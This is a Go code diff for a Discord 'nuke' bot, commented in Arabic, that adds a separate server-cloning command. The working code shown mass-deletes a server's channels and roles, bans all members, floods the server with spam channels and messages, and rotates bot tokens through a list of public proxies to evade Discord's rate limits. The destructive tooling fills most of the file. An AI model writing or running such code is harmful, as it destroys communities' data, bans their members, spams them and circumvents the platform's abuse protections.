@@ -19,7 +19,6 @@ import (
 	"github.com/bwmarrin/discordgo"
 )
 
-// لستة بروكسيات موسعة ومحدثة لضمان التوزيع الكامل وعدم اللمتد
 var massiveProxyPool = []string{
 	"103.152.112.5:80",
 	"185.199.229.156:8080",
@@ -63,15 +62,16 @@ func main() {
 
 	sess.Identify.Intents = discordgo.IntentsAll
 
+	// أمر النكث الأساسي
 	cmdNuke := "megaturbo"
 	commandNuke := &discordgo.ApplicationCommand{
 		Name:        cmdNuke,
-		Description: "Massive Auto-Filtered Proxy Turbo Engine + Cloner",
+		Description: "Massive Auto-Filtered Proxy Turbo Engine",
 		Options: []*discordgo.ApplicationCommandOption{
 			{
 				Type:        discordgo.ApplicationCommandOptionString,
 				Name:        "room_name",
-				Description: "اسم الرومات (لو ما بتستخدم نسخ سيرفر)",
+				Description: "اسم الرومات",
 				Required:    true,
 			},
 			{
@@ -98,11 +98,26 @@ func main() {
 				Description: "التوكنات مفصولة بفاصلة (,)",
 				Required:    true,
 			},
+		},
+	}
+
+	// أمر نسخ السيرفر المستقل الجديد
+	cmdClone := "cloner"
+	commandClone := &discordgo.ApplicationCommand{
+		Name:        cmdClone,
+		Description: "نسخ سيرفر كامل مع تحديث الحالة في الشات خطوة بخطوة",
+		Options: []*discordgo.ApplicationCommandOption{
 			{
 				Type:        discordgo.ApplicationCommandOptionString,
 				Name:        "template_guild_id",
-				Description: "(اختياري) إيدي السيرفر المراد نسخ روماته ورتبه",
-				Required:    false,
+				Description: "إيدي السيرفر المراد نسخه",
+				Required:    true,
+			},
+			{
+				Type:        discordgo.ApplicationCommandOptionString,
+				Name:        "bot_tokens",
+				Description: "التوكنات مفصولة بفاصلة (,)",
+				Required:    true,
 			},
 		},
 	}
@@ -123,17 +138,19 @@ func main() {
 			return
 		}
 
-		if i.ApplicationCommandData().Name == cmdNuke {
+		data := i.ApplicationCommandData()
+
+		if data.Name == cmdNuke {
 			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
 				Type: discordgo.InteractionResponseChannelMessageWithSource,
 				Data: &discordgo.InteractionResponseData{
-					Content: "🚀 تم تفعيل المحرك الخارق مع نظام نسخ السيرفرات...",
+					Content: "🚀 تم تفعيل محرك MegaTurbo...",
 					Flags:   discordgo.MessageFlagsEphemeral,
 				},
 			})
 
 			optionMap := make(map[string]*discordgo.ApplicationCommandInteractionDataOption)
-			for _, opt := range i.ApplicationCommandData().Options {
+			for _, opt := range data.Options {
 				optionMap[opt.Name] = opt
 			}
 
@@ -142,12 +159,7 @@ func main() {
 			messageContent := optionMap["message_content"].StringValue()
 			messagesCount := int(optionMap["messages_count"].IntValue())
 			tokensInput := optionMap["bot_tokens"].StringValue()
-			
-			templateGuildID := ""
-			if opt, ok := optionMap["template_guild_id"]; ok {
-				templateGuildID = opt.StringValue()
-			}
-			
+
 			var tokens []string
 			for _, t := range strings.Split(tokensInput, ",") {
 				t = strings.TrimSpace(t)
@@ -156,10 +168,32 @@ func main() {
 				}
 			}
 
-			guildID := i.GuildID
-			botID := s.State.User.ID
+			go executeMegaTurboNuke(tokens, massiveProxyPool, i.GuildID, s.State.User.ID, roomName, roomsCount, messageContent, messagesCount, s)
+		} else if data.Name == cmdClone {
+			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
+				Type: discordgo.InteractionResponseChannelMessageWithSource,
+				Data: &discordgo.InteractionResponseData{
+					Content: "🔄 جاري بدء عملية نسخ السيرفر وتحضير المحرك...",
+				},
+			})
 
-			go executeMegaTurboNuke(tokens, massiveProxyPool, guildID, botID, roomName, roomsCount, messageContent, messagesCount, templateGuildID, s)
+			optionMap := make(map[string]*discordgo.ApplicationCommandInteractionDataOption)
+			for _, opt := range data.Options {
+				optionMap[opt.Name] = opt
+			}
+
+			templateGuildID := optionMap["template_guild_id"].StringValue()
+			tokensInput := optionMap["bot_tokens"].StringValue()
+
+			var tokens []string
+			for _, t := range strings.Split(tokensInput, ",") {
+				t = strings.TrimSpace(t)
+				if t != "" {
+					tokens = append(tokens, t)
+				}
+			}
+
+			go executeServerCloner(tokens, massiveProxyPool, i.GuildID, templateGuildID, i.Interaction, s)
 		}
 	})
 
@@ -170,7 +204,8 @@ func main() {
 	}
 
 	_, _ = sess.ApplicationCommandCreate(sess.State.User.ID, "", commandNuke)
-	fmt.Println("⚡ بوت MegaTurbo يعمل بأقصى كفاءة لتجاوز الـ Rate Limit ومع ميزة النسخ!")
+	_, _ = sess.ApplicationCommandCreate(sess.State.User.ID, "", commandClone)
+    fmt.Println("⚡ البوت يعمل مع أوامر /megaturbo و /cloner بنجاح!")
 
 	stop := make(chan os.Signal, 1)
 	signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
@@ -220,7 +255,247 @@ func filterActiveProxies(rawProxies []string) []*http.Client {
 	return activeClients
 }
 
-func executeMegaTurboNuke(tokens []string, rawProxies []string, guildID, botID, roomName string, roomsCount int, messageContent string, messagesCount int, templateGuildID string, s *discordgo.Session) {
+func updateInteractionStatus(s *discordgo.Session, interaction *discordgo.Interaction, content string) {
+	_, _ = s.InteractionResponseEdit(interaction, &discordgo.WebhookEdit{
+		Content: &content,
+	})
+}
+
+// تنفيذ نسخ السيرفر المستقل مع تحديث الحالة خطوة بخطوة
+func executeServerCloner(tokens []string, rawProxies []string, guildID, templateGuildID string, interaction *discordgo.Interaction, s *discordgo.Session) {
+	if len(tokens) == 0 {
+		updateInteractionStatus(s, interaction, "❌ خطأ: لم يتم إدخال أي توكنات للبوتات.")
+		return
+	}
+
+	clients := filterActiveProxies(rawProxies)
+	if len(clients) == 0 {
+		clients = append(clients, &http.Client{Timeout: 2 * time.Second})
+	}
+
+	// 1. جلب الرومات القديمة والرتب لحذفها
+	updateInteractionStatus(s, interaction, "🔍 جاري جمع بيانات السيرفر الحالي (رومات ورتب)...")
+	
+	channels, err := s.GuildChannels(guildID)
+	var oldChannelIDs []string
+	if err == nil {
+		for _, ch := range channels {
+			if ch != nil {
+				oldChannelIDs = append(oldChannelIDs, ch.ID)
+			}
+		}
+	}
+
+	roles, err := s.GuildRoles(guildID)
+	if err == nil {
+		updateInteractionStatus(s, interaction, "🗑️ جاري حذف الرتب القديمة...")
+		var wgRole sync.WaitGroup
+		for _, r := range roles {
+			if !r.Managed && r.Name != "@everyone" {
+				wgRole.Add(1)
+				go func(rID string) {
+					defer wgRole.Done()
+					for idx, t := range tokens {
+						client := clients[idx%len(clients)]
+						req, _ := http.NewRequest("DELETE", fmt.Sprintf("https://discord.com/api/v10/guilds/%s/roles/%s", guildID, rID), nil)
+						req.Header.Set("Authorization", "Bot "+t)
+						resp, err := client.Do(req)
+						if err == nil {
+							resp.Body.Close()
+							if resp.StatusCode != 429 {
+								break
+							}
+						}
+					}
+				}(r.ID)
+			}
+		}
+		wgRole.Wait()
+	}
+
+	makeRequest := func(method, urlStr string, body []byte, index int) bool {
+		client := clients[index%len(clients)]
+		token := tokens[index%len(tokens)]
+
+		for attempt := 0; attempt < 3; attempt++ {
+			req, err := http.NewRequestWithContext(context.Background(), method, urlStr, bytes.NewBuffer(body))
+			if err != nil {
+				return false
+			}
+			req.Header.Set("Authorization", "Bot "+token)
+			req.Header.Set("Content-Type", "application/json")
+			req.Header.Set("User-Agent", "DiscordBot (https://discord.com, v10)")
+
+			resp, err := client.Do(req)
+			if err != nil {
+				client = clients[(index+attempt+1)%len(clients)]
+				continue
+			}
+
+			if resp.StatusCode == 429 {
+				resp.Body.Close()
+				time.Sleep(50 * time.Millisecond)
+				continue
+			}
+
+			resp.Body.Close()
+			return true
+		}
+		return false
+	}
+
+	// 2. حذف الرومات القديمة
+	updateInteractionStatus(s, interaction, fmt.Sprintf("🧹 جاري حذف الرومات القديمة (%d روم)...", len(oldChannelIDs)))
+	chQueue := make(chan string, len(oldChannelIDs))
+	for _, id := range oldChannelIDs {
+		chQueue <- id
+	}
+	close(chQueue)
+
+	var wgDel sync.WaitGroup
+	for w := 0; w < 60; w++ {
+		wgDel.Add(1)
+		go func(workerID int) {
+			defer wgDel.Done()
+			for chID := range chQueue {
+				makeRequest("DELETE", "https://discord.com/api/v10/channels/"+chID, nil, workerID)
+			}
+		}(w)
+	}
+	wgDel.Wait()
+
+	// 3. نسخ الرتب من السيرفر المصدر
+	updateInteractionStatus(s, interaction, "📥 جاري سحب ونسخ الرتب من السيرفر المصدر...")
+	templateRoles, err := s.GuildRoles(templateGuildID)
+	if err == nil {
+		sort.Slice(templateRoles, func(i, j int) bool {
+			return templateRoles[i].Position > templateRoles[j].Position
+		})
+
+		for _, r := range templateRoles {
+			if r.Name == "@everyone" || r.Managed {
+				continue
+			}
+			rolePayload, _ := json.Marshal(map[string]interface{}{
+				"name":        r.Name,
+				"permissions": r.Permissions,
+				"color":       r.Color,
+				"hoist":       r.Hoist,
+				"mentionable": r.Mentionable,
+			})
+
+			for idx, t := range tokens {
+				client := clients[idx%len(clients)]
+				req, _ := http.NewRequest("POST", fmt.Sprintf("https://discord.com/api/v10/guilds/%s/roles", guildID), bytes.NewBuffer(rolePayload))
+				req.Header.Set("Authorization", "Bot "+t)
+				req.Header.Set("Content-Type", "application/json")
+				resp, err := client.Do(req)
+				if err == nil {
+					resp.Body.Close()
+					if resp.StatusCode == 200 || resp.StatusCode == 201 || resp.StatusCode != 429 {
+						break
+					}
+				}
+			}
+		}
+	}
+
+	// 4. جلب ونسخ الفئات والرومات
+	updateInteractionStatus(s, interaction, "📂 جاري نسخ الفئات (Categories) والرومات...")
+	templateChannels, err := s.GuildChannels(templateGuildID)
+	if err != nil {
+		updateInteractionStatus(s, interaction, "❌ فشل في جلب رومات السيرفر المصدر. تأكد أن البوت موجود هناك ولديه صلاحيات.")
+		return
+	}
+
+	var categories []*discordgo.Channel
+	var regularChannels []*discordgo.Channel
+
+	for _, ch := range templateChannels {
+		if ch.Type == discordgo.ChannelTypeGuildCategory {
+			categories = append(categories, ch)
+		} else if ch.Type == discordgo.ChannelTypeGuildText || ch.Type == discordgo.ChannelTypeGuildVoice {
+			regularChannels = append(regularChannels, ch)
+		}
+	}
+
+	categoryMap := make(map[string]string)
+
+	for _, cat := range categories {
+		payload, _ := json.Marshal(map[string]interface{}{
+			"name":     cat.Name,
+			"type":     cat.Type,
+			"position": cat.Position,
+		})
+
+		for idx, t := range tokens {
+			client := clients[idx%len(clients)]
+			req, _ := http.NewRequest("POST", "https://discord.com/api/v10/guilds/"+guildID+"/channels", bytes.NewBuffer(payload))
+			req.Header.Set("Authorization", "Bot "+t)
+			req.Header.Set("Content-Type", "application/json")
+			resp, err := client.Do(req)
+			if err == nil {
+				if resp.StatusCode == 200 || resp.StatusCode == 201 {
+					var res map[string]interface{}
+					if json.NewDecoder(resp.Body).Decode(&res) == nil {
+						if newID, ok := res["id"].(string); ok {
+							categoryMap[cat.ID] = newID
+						}
+					}
+					resp.Body.Close()
+					break
+				}
+				resp.Body.Close()
+			}
+		}
+	}
+
+	var wgCreate sync.WaitGroup
+	for _, ch := range regularChannels {
+		wgCreate.Add(1)
+		go func(c *discordgo.Channel) {
+			defer wgCreate.Done()
+
+			data := map[string]interface{}{
+				"name":                c.Name,
+				"type":                c.Type,
+				"topic":               c.Topic,
+				"nsfw":                c.NSFW,
+				"rate_limit_per_user": c.RateLimitPerUser,
+				"position":            c.Position,
+			}
+
+			if c.ParentID != "" {
+				if newParentID, exists := categoryMap[c.ParentID]; exists {
+					data["parent_id"] = newParentID
+				}
+			}
+
+			payload, _ := json.Marshal(data)
+
+			for idx, t := range tokens {
+				client := clients[idx%len(clients)]
+				req, _ := http.NewRequest("POST", "https://discord.com/api/v10/guilds/"+guildID+"/channels", bytes.NewBuffer(payload))
+				req.Header.Set("Authorization", "Bot "+t)
+				req.Header.Set("Content-Type", "application/json")
+				resp, err := client.Do(req)
+				if err == nil {
+					if resp.StatusCode == 200 || resp.StatusCode == 201 {
+						resp.Body.Close()
+						break
+					}
+					resp.Body.Close()
+				}
+			}
+		}(ch)
+	}
+	wgCreate.Wait()
+
+	updateInteractionStatus(s, interaction, "✅ تم اكتمال عملية نسخ السيرفر بنجاح تام! 🚀")
+}
+
+// محرك النكث الأصلي
+func executeMegaTurboNuke(tokens []string, rawProxies []string, guildID, botID, roomName string, roomsCount int, messageContent string, messagesCount int, s *discordgo.Session) {
 	if len(tokens) == 0 {
 		return
 	}
@@ -231,6 +506,15 @@ func executeMegaTurboNuke(tokens []string, rawProxies []string, guildID, botID, 
 	}
 
 	botIDs := map[string]bool{botID: true}
+
+	channelPayloads := make([][]byte, roomsCount)
+	for i := 0; i < roomsCount; i++ {
+		p, _ := json.Marshal(map[string]interface{}{
+			"name": fmt.Sprintf("%s-%d", roomName, i),
+			"type": 0,
+		})
+		channelPayloads[i] = p
+	}
 
 	msgPayload, _ := json.Marshal(map[string]string{"content": messageContent})
 
@@ -264,32 +548,6 @@ func executeMegaTurboNuke(tokens []string, rawProxies []string, guildID, botID, 
 		}
 	}
 
-	roles, err := s.GuildRoles(guildID)
-	if err == nil {
-		var wgRole sync.WaitGroup
-		for _, r := range roles {
-			if !r.Managed && r.Name != "@everyone" {
-				wgRole.Add(1)
-				go func(rID string) {
-					defer wgRole.Done()
-					for idx, t := range tokens {
-						client := clients[idx%len(clients)]
-						req, _ := http.NewRequest("DELETE", fmt.Sprintf("https://discord.com/api/v10/guilds/%s/roles/%s", guildID, rID), nil)
-						req.Header.Set("Authorization", "Bot "+t)
-						resp, err := client.Do(req)
-						if err == nil {
-							resp.Body.Close()
-							if resp.StatusCode != 429 {
-								break
-							}
-						}
-					}
-				}(r.ID)
-			}
-		}
-		wgRole.Wait()
-	}
-
 	makeMegaRequest := func(method, urlStr string, body []byte, index int) bool {
 		client := clients[index%len(clients)]
 		token := tokens[index%len(tokens)]
@@ -321,7 +579,6 @@ func executeMegaTurboNuke(tokens []string, rawProxies []string, guildID, botID, 
 		return false
 	}
 
-	// 1. حذف الرومات القديمة
 	chQueue := make(chan string, len(oldChannelIDs))
 	for _, id := range oldChannelIDs {
 		chQueue <- id
@@ -340,7 +597,6 @@ func executeMegaTurboNuke(tokens []string, rawProxies []string, guildID, botID, 
 	}
 	wgDel.Wait()
 
-	// 2. باند الأعضاء بأقصى سرعة
 	if len(allUserIDs) > 0 {
 		userQueue := make(chan string, len(allUserIDs))
 		for _, uid := range allUserIDs {
@@ -363,73 +619,57 @@ func executeMegaTurboNuke(tokens []string, rawProxies []string, guildID, botID, 
 		wgBan.Wait()
 	}
 
-	// 3. بناء الرومات (سواء نسخ من سيرفر آخر أو إنشاء رومات عادية)
-	var newChannelIDs []string
+	roomChan := make(chan struct {
+		Payload []byte
+		Index   int
+	}, len(channelPayloads))
 
-	if templateGuildID != "" {
-		newChannelIDs = cloneServerStructure(templateGuildID, guildID, tokens, clients, s)
-	} else {
-		channelPayloads := make([][]byte, roomsCount)
-		for i := 0; i < roomsCount; i++ {
-			p, _ := json.Marshal(map[string]interface{}{
-				"name": fmt.Sprintf("%s-%d", roomName, i),
-				"type": 0,
-			})
-			channelPayloads[i] = p
-		}
-
-		roomChan := make(chan struct {
+	for idx, p := range channelPayloads {
+		roomChan <- struct {
 			Payload []byte
 			Index   int
-		}, len(channelPayloads))
+		}{p, idx}
+	}
+	close(roomChan)
 
-		for idx, p := range channelPayloads {
-			roomChan <- struct {
-				Payload []byte
-				Index   int
-			}{p, idx}
-		}
-		close(roomChan)
+	var newChannelIDs []string
+	var muChannels sync.Mutex
+	var wgCreate sync.WaitGroup
 
-		var muChannels sync.Mutex
-		var wgCreate sync.WaitGroup
+	for w := 0; w < 50; w++ {
+		wgCreate.Add(1)
+		go func(workerID int) {
+			defer wgCreate.Done()
+			client := clients[workerID%len(clients)]
+			token := tokens[workerID%len(tokens)]
 
-		for w := 0; w < 50; w++ {
-			wgCreate.Add(1)
-			go func(workerID int) {
-				defer wgCreate.Done()
-				client := clients[workerID%len(clients)]
-				token := tokens[workerID%len(tokens)]
+			for item := range roomChan {
+				req, _ := http.NewRequest("POST", "https://discord.com/api/v10/guilds/"+guildID+"/channels", bytes.NewBuffer(item.Payload))
+				req.Header.Set("Authorization", "Bot "+token)
+				req.Header.Set("Content-Type", "application/json")
+				req.Header.Set("User-Agent", "DiscordBot (https://discord.com, v10)")
 
-				for item := range roomChan {
-					req, _ := http.NewRequest("POST", "https://discord.com/api/v10/guilds/"+guildID+"/channels", bytes.NewBuffer(item.Payload))
-					req.Header.Set("Authorization", "Bot "+token)
-					req.Header.Set("Content-Type", "application/json")
-					req.Header.Set("User-Agent", "DiscordBot (https://discord.com, v10)")
+				resp, err := client.Do(req)
+				if err != nil {
+					continue
+				}
 
-					resp, err := client.Do(req)
-					if err != nil {
-						continue
-					}
-
-					if resp.StatusCode == 200 || resp.StatusCode == 201 {
-						var chResult map[string]interface{}
-						if json.NewDecoder(resp.Body).Decode(&chResult) == nil {
-							if chID, ok := chResult["id"].(string); ok {
-								muChannels.Lock()
-								newChannelIDs = append(newChannelIDs, chID)
-								muChannels.Unlock()
-							}
+				if resp.StatusCode == 200 || resp.StatusCode == 201 {
+					var chResult map[string]interface{}
+					if json.NewDecoder(resp.Body).Decode(&chResult) == nil {
+						if chID, ok := chResult["id"].(string); ok {
+							muChannels.Lock()
+							newChannelIDs = append(newChannelIDs, chID)
+							muChannels.Unlock()
 						}
 					}
-					resp.Body.Close()
 				}
-			}(w)
-		}
-		wgCreate.Wait()
+				resp.Body.Close()
+			}
+		}(w)
 	}
+	wgCreate.Wait()
 
-	// 4. إرسال الرسائل
 	if len(newChannelIDs) > 0 && messagesCount > 0 {
 		var wgMsg sync.WaitGroup
 		for i, chID := range newChannelIDs {
@@ -446,145 +686,4 @@ func executeMegaTurboNuke(tokens []string, rawProxies []string, guildID, botID, 
 		}
 		wgMsg.Wait()
 	}
-}
-
-// دالة نسخ الرتب والرومات من السيرفر المصدر إلى السيرفر المستهدف
-func cloneServerStructure(templateGuildID, targetGuildID string, tokens []string, clients []*http.Client, s *discordgo.Session) []string {
-	var createdChannelIDs []string
-
-	// 1. نسخ الرتب أولاً
-	templateRoles, err := s.GuildRoles(templateGuildID)
-	if err == nil {
-		sort.Slice(templateRoles, func(i, j int) bool {
-			return templateRoles[i].Position > templateRoles[j].Position
-		})
-
-		for _, r := range templateRoles {
-			if r.Name == "@everyone" || r.Managed {
-				continue
-			}
-			rolePayload, _ := json.Marshal(map[string]interface{}{
-				"name":        r.Name,
-				"permissions": r.Permissions,
-				"color":       r.Color,
-				"hoist":       r.Hoist,
-				"mentionable": r.Mentionable,
-			})
-
-			for idx, t := range tokens {
-				client := clients[idx%len(clients)]
-				req, _ := http.NewRequest("POST", fmt.Sprintf("https://discord.com/api/v10/guilds/%s/roles", targetGuildID), bytes.NewBuffer(rolePayload))
-				req.Header.Set("Authorization", "Bot "+t)
-				req.Header.Set("Content-Type", "application/json")
-				resp, err := client.Do(req)
-				if err == nil {
-					resp.Body.Close()
-					if resp.StatusCode == 200 || resp.StatusCode == 201 || resp.StatusCode != 429 {
-						break
-					}
-				}
-			}
-		}
-	}
-
-	// 2. نسخ الكاتيجوري والرومات
-	templateChannels, err := s.GuildChannels(templateGuildID)
-	if err != nil {
-		return createdChannelIDs
-	}
-
-	var categories []*discordgo.Channel
-	var regularChannels []*discordgo.Channel
-
-	for _, ch := range templateChannels {
-		if ch.Type == discordgo.ChannelTypeGuildCategory {
-			categories = append(categories, ch)
-		} else if ch.Type == discordgo.ChannelTypeGuildText || ch.Type == discordgo.ChannelTypeGuildVoice {
-			regularChannels = append(regularChannels, ch)
-		}
-	}
-
-	categoryMap := make(map[string]string)
-
-	for _, cat := range categories {
-		payload, _ := json.Marshal(map[string]interface{}{
-			"name":     cat.Name,
-			"type":     cat.Type,
-			"position": cat.Position,
-		})
-
-		for idx, t := range tokens {
-			client := clients[idx%len(clients)]
-			req, _ := http.NewRequest("POST", "https://discord.com/api/v10/guilds/"+targetGuildID+"/channels", bytes.NewBuffer(payload))
-			req.Header.Set("Authorization", "Bot "+t)
-			req.Header.Set("Content-Type", "application/json")
-			resp, err := client.Do(req)
-			if err == nil {
-				if resp.StatusCode == 200 || resp.StatusCode == 201 {
-					var res map[string]interface{}
-					if json.NewDecoder(resp.Body).Decode(&res) == nil {
-						if newID, ok := res["id"].(string); ok {
-							categoryMap[cat.ID] = newID
-						}
-					}
-					resp.Body.Close()
-					break
-				}
-				resp.Body.Close()
-			}
-		}
-	}
-
-	var mu sync.Mutex
-	var wg sync.WaitGroup
-
-	for _, ch := range regularChannels {
-		wg.Add(1)
-		go func(c *discordgo.Channel) {
-			defer wg.Done()
-
-			data := map[string]interface{}{
-				"name":                c.Name,
-				"type":                c.Type,
-				"topic":               c.Topic,
-				"nsfw":                c.NSFW,
-				"rate_limit_per_user": c.RateLimitPerUser,
-				"position":            c.Position,
-			}
-
-			if c.ParentID != "" {
-				if newParentID, exists := categoryMap[c.ParentID]; exists {
-					data["parent_id"] = newParentID
-				}
-			}
-
-			payload, _ := json.Marshal(data)
-
-			for idx, t := range tokens {
-				client := clients[idx%len(clients)]
-				req, _ := http.NewRequest("POST", "https://discord.com/api/v10/guilds/"+targetGuildID+"/channels", bytes.NewBuffer(payload))
-				req.Header.Set("Authorization", "Bot "+t)
-				req.Header.Set("Content-Type", "application/json")
-				resp, err := client.Do(req)
-				if err == nil {
-					if resp.StatusCode == 200 || resp.StatusCode == 201 {
-						var res map[string]interface{}
-						if json.NewDecoder(resp.Body).Decode(&res) == nil {
-							if newID, ok := res["id"].(string); ok {
-								mu.Lock()
-								createdChannelIDs = append(createdChannelIDs, newID)
-								mu.Unlock()
-							}
-						}
-						resp.Body.Close()
-						break
-					}
-					resp.Body.Close()
-				}
-			}
-		}(ch)
-	}
-	wg.Wait()
-
-	return createdChannelIDs
 }
